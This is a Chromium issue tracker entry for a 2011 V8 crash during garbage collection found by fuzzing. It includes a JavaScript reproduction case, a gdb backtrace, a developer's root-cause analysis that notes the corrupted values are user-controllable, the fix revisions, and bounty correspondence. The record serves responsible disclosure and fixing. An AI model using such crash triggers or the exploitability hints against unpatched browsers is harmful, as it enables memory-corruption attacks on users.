# [LangFuzz] V8: Crash in HeapObject::map_word on GC

| Field | Value |
|-------|-------|
| **Issue ID** | [40089546](https://issues.chromium.org/issues/40089546) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals |
| **Reporter** | de...@googlemail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2011-04-03 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Crash in V8 on garbage collect, most likely due to memory corruption.

**VERSION**  

Chrome Version: 11.0.696.28 (79742) Beta  

Operating System: Ubuntu 11.04 (32 bit)

**REPRODUCTION CASE**

<html><head><title>Crash</title>
<script type="text/javascript">
while (true) try {
var object = { };
function g(f0) {
var f0 = (object instanceof encodeURI)('foo');
}
g(75);
} catch (g) { }
</script>
</head></html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

(gdb) x /4i $pc  

=> 0xedb57c <v8::internal::RootMarkingVisitor::VisitPointers(v8::internal::Object\*\*, v8::internal::Object\*\*)+60>: mov -0x1(%eax),%ebp  

0xedb57f <v8::internal::RootMarkingVisitor::VisitPointers(v8::internal::Object\*\*, v8::internal::Object\*\*)+63>: mov %ebp,%edx  

0xedb581 <v8::internal::RootMarkingVisitor::VisitPointers(v8::internal::Object\*\*, v8::internal::Object\*\*)+65>: or $0x1,%edx  

0xedb584 <v8::internal::RootMarkingVisitor::VisitPointers(v8::internal::Object\*\*, v8::internal::Object\*\*)+68>: movzbl 0x7(%edx),%edx

(gdb) info registers eax ebp  

eax 0x75 117  

ebp 0xbfffd840 0xbfffd840

Program received signal SIGSEGV, Segmentation fault.  

0x00edb57c in map\_word (this=0xbfffd57c, start=0xbfffd840, end=0xbfffd860)  

at v8/src/objects-inl.h:1112  

1112 v8/src/objects-inl.h: No such file or directory.  

in v8/src/objects-inl.h  

(gdb) bt  

#0 0x00edb57c in map\_word (this=0xbfffd57c, start=0xbfffd840, end=0xbfffd860)  

at v8/src/objects-inl.h:1112  

#1 ShortCircuitConsString (this=0xbfffd57c, start=0xbfffd840, end=0xbfffd860)  

at v8/src/mark-compact.cc:356  

#2 MarkObjectByPointer (this=0xbfffd57c, start=0xbfffd840, end=0xbfffd860)  

at v8/src/mark-compact.cc:946  

#3 v8::internal::RootMarkingVisitor::VisitPointers (this=0xbfffd57c,  

start=0xbfffd840, end=0xbfffd860) at v8/src/mark-compact.cc:938  

#4 0x00e6b97e in v8::internal::OptimizedFrame::Iterate (this=0xbfffd44c, v=  

0xbfffd57c) at v8/src/frames.cc:580  

#5 0x00f630b5 in v8::internal::Top::Iterate (v=0xbfffd57c, thread=0x2fcbc20)  

at v8/src/top.cc:149  

#6 0x00f63135 in v8::internal::Top::Iterate (v=0xbfffd57c)  

at v8/src/top.cc:156  

#7 0x00e80d1f in v8::internal::Heap::IterateStrongRoots (v=0xbfffd57c,  

mode=v8::internal::VISIT\_ONLY\_STRONG) at v8/src/heap.cc:4407  

#8 0x00edbbb4 in v8::internal::MarkCompactCollector::MarkRoots (  

visitor=0xbfffd57c) at v8/src/mark-compact.cc:1154  

#9 0x00edbe36 in v8::internal::MarkCompactCollector::MarkLiveObjects ()  

at v8/src/mark-compact.cc:1311  

#10 0x00ee0ba2 in v8::internal::MarkCompactCollector::CollectGarbage ()  

at v8/src/mark-compact.cc:80  

#11 0x00e821c7 in v8::internal::Heap::MarkCompact (tracer=0xbfffd678)  

at v8/src/heap.cc:826  

#12 0x00e82554 in v8::internal::Heap::PerformGarbageCollection (  

collector=v8::internal::MARK\_COMPACTOR, tracer=0xbfffd678)  

at v8/src/heap.cc:737  

#13 0x00e8382a in v8::internal::Heap::CollectGarbage (  

space=v8::internal::NEW\_SPACE, collector=v8::internal::MARK\_COMPACTOR)  

at v8/src/heap.cc:509  

#14 0x00f3b73d in CollectGarbage (result=0x3) at v8/src/heap-inl.h:412  

#15 v8::internal::Runtime::PerformGC (result=0x3) at v8/src/runtime.cc:11582  

<---snip--->  

#29 0x00e5c38e in v8::internal::Invoke (construct=<value optimized out>,  

func=..., receiver=..., argc=0, args=0x0, has\_pending\_exception=0xbfffda9f)  

at v8/src/execution.cc:96  

#30 0x00e5c918 in v8::internal::Execution::Call (func=..., receiver=...,  

argc=0, args=0x0, pending\_exception=0xbfffda9f) at v8/src/execution.cc:128  

#31 0x00e2ed14 in v8::Script::Run (this=0x31f90b8) at v8/src/api.cc:1314  

<---snip--->

## Timeline

### sc...@gmail.com (2011-04-03)

Mads / Soeren -- mind taking a look? I'm happy to triage it when I get in on Monday, but I thought I'd offer you guys a chance since you're 8 or 9 hours ahead :)

### ag...@chromium.org (2011-04-04)

[Empty comment from Monorail migration]

### ve...@chromium.org (2011-04-07)

Fixed in revision r7540 (depends on r7504 to function properly on x64). The problem was: incorrect safepoint (Safepoint::kSimple instead of Safepoint::kWithRegisters) was recorded for stubcall in deferred part of LInstanceOfKnownGlobal. Because of this GC was incorrectly interpreting stack contents --- pushed values of non-pointer registers were interpreted as tagged pointers (one of the pused registers contained raw integer --- delta to mapcheck).

I will propagate the fix into branches.

### js...@chromium.org (2011-04-07)

Thanks. This needs to be merged to the m11 branch, but you can skip m10 at this point. For severity ranking purposes, are any of those misinterpreted stack values user controllable?

### ve...@chromium.org (2011-04-07)

I would say yes.
Top value (the one that is visited first) is delta to map check --- user can control it by changing code size of the "bad" function (g in the repro).
Other values are pushed registers --- user again can control some of them by carefully constructing "bad" function. I think user can construct any int32 value here. If constructed value is odd number GC will try to interpret it as a tagged pointer to an object.

### js...@chromium.org (2011-04-07)

Thanks, that clarifies it.

### ve...@chromium.org (2011-04-08)

In https://crbug.com/chromium/78270#c3 I mentioned incorrect revisions, correct revs are 7516, 7541.

I merged the fix into V8 3.1 branch (which corresponds to m11), corresponding rev. 7555, version 3.1.8.10.

### sc...@gmail.com (2011-04-15)

Did this affect M10?

### sc...@gmail.com (2011-04-19)

@decoder.oh: thanks for re-running your fuzzer and catching this issue! It qualifies for a provisional $1000 Chromium Security Reward!

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### de...@googlemail.com (2011-04-19)

Thanks! :) I got two more issues which I'll report shortly at the v8 tracker though because they don't crash.

Cheers,

Chris

### sc...@gmail.com (2011-05-06)

Invoice finalized; payment is in e-payment system; it can take a couple of weeks.

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/78270?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089546)*
